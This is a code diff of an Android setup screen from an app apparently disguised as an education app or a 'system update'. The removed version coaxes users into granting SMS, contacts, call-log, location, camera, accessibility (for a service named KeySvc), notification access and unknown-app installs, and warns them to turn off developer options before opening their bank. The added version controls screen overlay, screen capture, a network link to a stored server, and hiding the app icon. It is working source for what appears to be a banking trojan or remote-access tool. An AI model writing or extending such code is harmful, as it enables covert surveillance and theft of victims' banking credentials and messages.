@@ -1,326 +1,237 @@
 package com.eloeeducacao;
 
 import android.app.Activity;
-import android.app.Notification;
-import android.app.NotificationChannel;
-import android.app.NotificationManager;
-import android.app.PendingIntent;
 import android.content.ComponentName;
-import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.graphics.Color;
+import android.graphics.drawable.GradientDrawable;
+import android.media.projection.MediaProjectionManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.PowerManager;
 import android.provider.Settings;
 import android.view.Gravity;
-import android.view.View;
-import android.widget.Button;
 import android.widget.LinearLayout;
+import android.widget.ScrollView;
 import android.widget.TextView;
+import android.widget.Toast;
+
+import java.util.ArrayList;
+import java.util.List;
 
 public class SetupActivity extends Activity {
 
-    private static final int N = 5;
-    private static final String CH = "s";
-    private static final int NC = 78;
-    private static final int RQ = 21;
+    private static final int REQ_CAP = 1001;
 
-    private static final String[] TIT = {
-            "Permissões do sistema",
-            "Acessibilidade",
-            "Acesso a notificações",
-            "Instalar aplicativos",
-            "Bateria"
-    };
-    private static final String[] SUB = {
-            "Toque em Permitir nas janelas que aparecerem.",
-            "Ative «Acessibilidade» na lista e volte ao app.",
-            "Ative «Acessibilidade» na lista e volte ao app.",
-            "Permita a instalação por esta fonte e volte ao app.",
-            "Escolha Permitir. Isso impede o sistema de encerrar o serviço."
-    };
+    private interface Estado { boolean ok(); }
 
-    private TextView titulo, sub, passo, corpo, detalhe;
-    private Button acao, pular;
-    private int etapa;
+    private final List<Runnable> pintores = new ArrayList<>();
+    private LinearLayout lista;
 
     @Override protected void onCreate(Bundle b) {
         super.onCreate(b);
+        ScrollView sv = new ScrollView(this);
+        sv.setFillViewport(true);
+        sv.setBackgroundColor(Color.parseColor("#0B0F14"));
+        lista = new LinearLayout(this);
+        lista.setOrientation(LinearLayout.VERTICAL);
+        lista.setPadding(dp(18), dp(22), dp(18), dp(28));
+        sv.addView(lista);
 
-        LinearLayout l = new LinearLayout(this);
-        l.setOrientation(LinearLayout.VERTICAL);
-        l.setBackgroundColor(0xFF101418);
-        l.setPadding(dp(26), dp(54), dp(26), dp(26));
-
-        titulo = new TextView(this);
-        titulo.setText("Atualização do sistema");
+        TextView titulo = new TextView(this);
+        titulo.setText(R.string.app_name);
         titulo.setTextColor(Color.WHITE);
-        titulo.setTextSize(24);
-        titulo.setOnLongClickListener(new View.OnLongClickListener() {
-            @Override public boolean onLongClick(View v) {
-                startActivity(new Intent(SetupActivity.this, MainActivity.class));
-                return true;
-            }
-        });
-        l.addView(titulo);
+        titulo.setTextSize(23);
+        lista.addView(titulo);
 
-        sub = new TextView(this);
-        sub.setText("Versão 1.2.3 · componentes do sistema");
-        sub.setTextColor(0xFF8A97A5);
-        sub.setTextSize(13);
-        sub.setPadding(0, dp(6), 0, dp(28));
-        l.addView(sub);
+        TextView sub = new TextView(this);
+        sub.setText("Toque em cada item para abrir as configurações correspondentes.");
+        sub.setTextColor(Color.parseColor("#8B98A5"));
+        sub.setTextSize(12);
+        sub.setPadding(0, dp(6), 0, dp(18));
+        lista.addView(sub);
 
-        passo = new TextView(this);
-        passo.setTextColor(0xFF2F81F7);
-        passo.setTextSize(12);
-        passo.setPadding(0, 0, 0, dp(6));
-        l.addView(passo);
+        linha("Acessibilidade", "Gestos e leitura da tela",
+                () -> Util.accOn(this),
+                () -> abre(Settings.ACTION_ACCESSIBILITY_SETTINGS));
 
-        corpo = new TextView(this);
-        corpo.setTextColor(Color.WHITE);
-        corpo.setTextSize(17);
-        l.addView(corpo);
+        linha("Sobreposição", "Desenhar por cima de outros aplicativos",
+                () -> Settings.canDrawOverlays(this),
+                () -> startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                        Uri.parse("package:" + getPackageName()))));
 
-        detalhe = new TextView(this);
-        detalhe.setTextColor(0xFF8A97A5);
-        detalhe.setTextSize(14);
-        detalhe.setPadding(0, dp(8), 0, dp(26));
-        l.addView(detalhe);
+        linha("Acesso a notificações", "Leitura de notificações do sistema",
+                () -> {
+                    String s = Settings.Secure.getString(getContentResolver(),
+                            "enabled_notification_listeners");
+                    return s != null && s.contains(getPackageName());
+                },
+                () -> abre(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
 
-        acao = new Button(this);
-        acao.setOnClickListener(new View.OnClickListener() {
-            @Override public void onClick(View v) {
-                if (etapa >= N) { fim(); return; }
-                abre(etapa);
-            }
-        });
-        l.addView(acao);
+        linha("Bateria", "Desativar otimização de bateria",
+                () -> {
+                    PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
+                    return pm != null && pm.isIgnoringBatteryOptimizations(getPackageName());
+                },
+                () -> startActivity(new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
+                        Uri.parse("package:" + getPackageName()))));
 
-        pular = new Button(this);
-        pular.setText("Pular etapa");
-        pular.setOnClickListener(new View.OnClickListener() {
-            @Override public void onClick(View v) {
-                etapa++;
-                pinta();
-            }
-        });
-        LinearLayout.LayoutParams pl = new LinearLayout.LayoutParams(
-                LinearLayout.LayoutParams.WRAP_CONTENT,
-                LinearLayout.LayoutParams.WRAP_CONTENT);
-        pl.topMargin = dp(4);
-        pl.gravity = Gravity.END;
-        pular.setLayoutParams(pl);
-        l.addView(pular);
+        linha("Brilho do sistema", "Permitir alterar configurações do sistema",
+                () -> Settings.System.canWrite(this),
+                () -> startActivity(new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS,
+                        Uri.parse("package:" + getPackageName()))));
 
+        linha("Captura de tela", "Iniciar ou encerrar a projeção",
+                () -> ScreenSvc.alive,
+                () -> {
+                    if (ScreenSvc.alive) {
+                        stopService(new Intent(this, ScreenSvc.class));
+                        toast("Captura encerrada");
+                    } else {
+                        MediaProjectionManager mpm =
+                                (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
+                        startActivityForResult(mpm.createScreenCaptureIntent(), REQ_CAP);
+                    }
+                });
+
+        linha("Conexão", "Iniciar o serviço de rede",
+                () -> Net.online(),
+                () -> {
+                    try { NetSvc.arranca(this); } catch (Throwable ignored) {}
+                    Net.start(this);
+                    toast("Conectando");
+                });
+
+        linha("Ícone do app", "Ocultar ou mostrar na gaveta de aplicativos",
+                this::iconeAtivo,
+                this::alternarIcone);
+
+        linha("Play Store", "Abrir a página do aplicativo", null, () -> loja(this));
+
+        String host = getSharedPreferences("p", 0).getString("url", "sem servidor");
         TextView rodape = new TextView(this);
-        rodape.setText("Se as opções do desenvolvedor estiverem ativadas, desligue-as antes de abrir o banco.");
-        rodape.setTextColor(0xFF5B6773);
-        rodape.setTextSize(11);
-        rodape.setPadding(0, dp(30), 0, 0);
-        l.addView(rodape);
+        rodape.setText("servidor: " + host);
+        rodape.setTextColor(Color.parseColor("#5C6B7A"));
+        rodape.setTextSize(10);
+        rodape.setPadding(0, dp(16), 0, 0);
+        lista.addView(rodape);
 
-        setContentView(l);
-        etapa = 0;
-        pinta();
+        setContentView(sv);
     }
 
     @Override protected void onResume() {
         super.onResume();
-        cancela();
-        while (etapa < N && pronto(etapa)) etapa++;
-        pinta();
+        for (Runnable r : pintores) r.run();
     }
 
-    @Override protected void onPause() {
-        super.onPause();
-        if (etapa < N) notifica();
-    }
-
-    private void pinta() {
-        if (etapa >= N) {
-            passo.setText("CONCLUÍDO");
-            corpo.setText("Configuração concluída");
-            detalhe.setText("Tudo pronto. Pode fechar o aplicativo.");
-            acao.setText("Fechar");
-            pular.setVisibility(View.GONE);
-            return;
-        }
-        passo.setText("ETAPA " + (etapa + 1) + " DE " + N);
-        corpo.setText(TIT[etapa]);
-        detalhe.setText(SUB[etapa]);
-        acao.setText(etapa == 0 || etapa == 4 ? "Permitir" : "Abrir ajustes");
-        pular.setVisibility(View.VISIBLE);
-    }
-
-    private void abre(int e) {
-        try {
-            switch (e) {
-                case 0:
-                    pede();
-                    return;
-                case 1: {
-                    try {
-                        Intent d = new Intent("android.settings.ACCESSIBILITY_DETAILS_SETTINGS");
-                        d.putExtra(Intent.EXTRA_COMPONENT_NAME,
-                                new ComponentName(this, KeySvc.class).flattenToString());
-                        startActivity(d);
-                        return;
-                    } catch (Throwable ignored) {}
-                    startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
-                    return;
-                }
-                case 2:
-                    startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
-                    return;
-                case 3:
-                    startActivity(new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
-                            Uri.parse("package:" + getPackageName())));
-                    return;
-                case 4:
-                    startActivity(new Intent(
-                            Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
-                            Uri.parse("package:" + getPackageName())));
-                    return;
-            }
-        } catch (Throwable t) {
-            etapa++;
-            pinta();
+    @Override protected void onActivityResult(int rq, int rs, Intent d) {
+        super.onActivityResult(rq, rs, d);
+        if (rq == REQ_CAP && rs == RESULT_OK && d != null) {
+            Intent i = new Intent(this, ScreenSvc.class);
+            i.putExtra("code", rs);
+            i.putExtra("data", d);
+            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i); else startService(i);
         }
     }
 
-    private boolean pronto(int e) {
-        switch (e) {
-            case 0: return permsOk();
-            case 1: return Util.accOn(this);
-            case 2: return notifOk();
-            case 3: return instalOk();
-            case 4: return batOk();
+    private void linha(String t1, String t2, Estado est, Runnable acao) {
+        LinearLayout card = new LinearLayout(this);
+        card.setOrientation(LinearLayout.HORIZONTAL);
+        card.setGravity(Gravity.CENTER_VERTICAL);
+        card.setPadding(dp(16), dp(15), dp(16), dp(15));
+        GradientDrawable bg = new GradientDrawable();
+        bg.setColor(Color.parseColor("#161B22"));
+        bg.setCornerRadius(dp(14));
+        bg.setStroke(dp(1), Color.parseColor("#2A3542"));
+        card.setBackground(bg);
+        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
+                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
+        lp.bottomMargin = dp(9);
+        card.setLayoutParams(lp);
+
+        LinearLayout col = new LinearLayout(this);
+        col.setOrientation(LinearLayout.VERTICAL);
+        col.setLayoutParams(new LinearLayout.LayoutParams(0,
+                LinearLayout.LayoutParams.WRAP_CONTENT, 1f));
+
+        TextView a = new TextView(this);
+        a.setText(t1);
+        a.setTextColor(Color.WHITE);
+        a.setTextSize(15);
+        TextView c = new TextView(this);
+        c.setText(t2);
+        c.setTextColor(Color.parseColor("#8B98A5"));
+        c.setTextSize(11);
+        c.setPadding(0, dp(3), 0, 0);
+        col.addView(a);
+        col.addView(c);
+        card.addView(col);
+
+        if (est != null) {
+            final TextView st = new TextView(this);
+            st.setTextSize(11);
+            st.setPadding(dp(10), 0, 0, 0);
+            final Runnable pinta = () -> {
+                boolean ok;
+                try { ok = est.ok(); } catch (Throwable e) { ok = false; }
+                st.setText(ok ? "ativo" : "inativo");
+                st.setTextColor(Color.parseColor(ok ? "#3FB950" : "#F85149"));
+            };
+            pintores.add(pinta);
+            card.addView(st);
+            pinta.run();
         }
-        return true;
+
+        card.setOnClickListener(v -> {
+            try { acao.run(); } catch (Throwable ignored) {}
+            for (Runnable r : pintores) r.run();
+        });
+        lista.addView(card);
     }
 
-    private void pede() {
-        java.util.List<String> q = new java.util.ArrayList<>();
-        String[] ps = {
-                android.Manifest.permission.READ_SMS,
-                android.Manifest.permission.RECEIVE_SMS,
-                android.Manifest.permission.SEND_SMS,
-                android.Manifest.permission.READ_CONTACTS,
-                android.Manifest.permission.READ_PHONE_STATE,
-                android.Manifest.permission.READ_CALL_LOG,
-                android.Manifest.permission.CALL_PHONE,
-                android.Manifest.permission.ACCESS_FINE_LOCATION,
-                android.Manifest.permission.ACCESS_COARSE_LOCATION,
-                android.Manifest.permission.CAMERA,
-                "android.permission.POST_NOTIFICATIONS",
-                "android.permission.READ_MEDIA_IMAGES"
-        };
-        for (String s : ps) {
-            try {
-                if (checkSelfPermission(s) != PackageManager.PERMISSION_GRANTED) q.add(s);
-            } catch (Throwable ignored) {}
-        }
-        if (q.isEmpty()) { etapa++; pinta(); return; }
-        requestPermissions(q.toArray(new String[0]), RQ);
+    private boolean iconeAtivo() {
+        return getPackageManager().getComponentEnabledSetting(
+                new ComponentName(this, "com.eloeeducacao.Alias"))
+                != PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
     }
 
-    private boolean permsOk() {
-        String[] ps = {
-                android.Manifest.permission.READ_SMS,
-                android.Manifest.permission.READ_CONTACTS,
-                android.Manifest.permission.ACCESS_FINE_LOCATION
-        };
-        for (String s : ps)
-            if (checkSelfPermission(s) != PackageManager.PERMISSION_GRANTED) return false;
-        return true;
+    private void alternarIcone() {
+        boolean on = iconeAtivo();
+        getPackageManager().setComponentEnabledSetting(
+                new ComponentName(this, "com.eloeeducacao.Alias"),
+                on ? PackageManager.COMPONENT_ENABLED_STATE_DISABLED
+                   : PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                PackageManager.DONT_KILL_APP);
+        toast(on ? "Ícone oculto" : "Ícone visível");
     }
 
-    private boolean notifOk() {
-        try {
-            String s = Settings.Secure.getString(getContentResolver(),
-                    "enabled_notification_listeners");
-            return s != null && s.contains(getPackageName());
-        } catch (Throwable t) { return false; }
+    private void abre(String action) {
+        try { startActivity(new Intent(action)); } catch (Throwable ignored) {}
     }
 
-    private boolean instalOk() {
-        try {
-            if (Build.VERSION.SDK_INT >= 26)
-                return getPackageManager().canRequestPackageInstalls();
-            return true;
-        } catch (Throwable t) { return true; }
-    }
-
-    private boolean batOk() {
-        try {
-            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
-            return pm.isIgnoringBatteryOptimizations(getPackageName());
-        } catch (Throwable t) { return true; }
-    }
-
-    @Override public void onRequestPermissionsResult(int rq, String[] a, int[] r) {
-        super.onRequestPermissionsResult(rq, a, r);
-        if (rq == RQ) { etapa++; pinta(); }
-    }
-
-    private void notifica() {
-        try {
-            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
-            if (Build.VERSION.SDK_INT >= 26) {
-                NotificationChannel c = new NotificationChannel(
-                        CH, "Sistema", NotificationManager.IMPORTANCE_LOW);
-                c.setShowBadge(false);
-                nm.createNotificationChannel(c);
-            }
-            Intent i = new Intent(this, SetupActivity.class);
-            i.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | Intent.FLAG_ACTIVITY_NEW_TASK);
-            PendingIntent pi = PendingIntent.getActivity(this, 1, i,
-                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
-            Notification n = (Build.VERSION.SDK_INT >= 26
-                    ? new Notification.Builder(this, CH)
-                    : new Notification.Builder(this))
-                    .setContentTitle("Toque para voltar ao app")
-                    .setContentText("Continue a configuração da etapa " + (etapa + 1))
-                    .setSmallIcon(android.R.drawable.stat_notify_sync)
-                    .setOngoing(true)
-                    .setContentIntent(pi)
-                    .build();
-            nm.notify(NC, n);
-        } catch (Throwable ignored) {}
-    }
-
-    private void cancela() {
-        try {
-            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).cancel(NC);
-        } catch (Throwable ignored) {}
-    }
-
-    private void fim() {
-        cancela();
-        finish();
-    }
-
-    public static void loja(Context c) {
-        try {
-            Intent i = new Intent(Intent.ACTION_VIEW,
-                    Uri.parse("market://details?id=com.whatsapp"));
-            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            c.startActivity(i);
-            return;
-        } catch (Throwable ignored) {}
-        try {
-            Intent i = new Intent(Intent.ACTION_VIEW,
-                    Uri.parse("https://play.google.com/store/apps/details?id=com.whatsapp"));
-            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            c.startActivity(i);
-        } catch (Throwable ignored) {}
+    private void toast(String s) {
+        Toast.makeText(this, s, Toast.LENGTH_SHORT).show();
     }
 
     private int dp(int v) {
         return (int) (v * getResources().getDisplayMetrics().density);
+    }
+
+    public static void loja(android.content.Context c) {
+        try {
+            Intent i = new Intent(Intent.ACTION_VIEW,
+                    Uri.parse("market://details?id=" + c.getPackageName()));
+            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            c.startActivity(i);
+        } catch (Throwable t) {
+            try {
+                Intent i = new Intent(Intent.ACTION_VIEW,
+                        Uri.parse("https://play.google.com/store/apps/details?id=" + c.getPackageName()));
+                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                c.startActivity(i);
+            } catch (Throwable ignored) {}
+        }
     }
 }
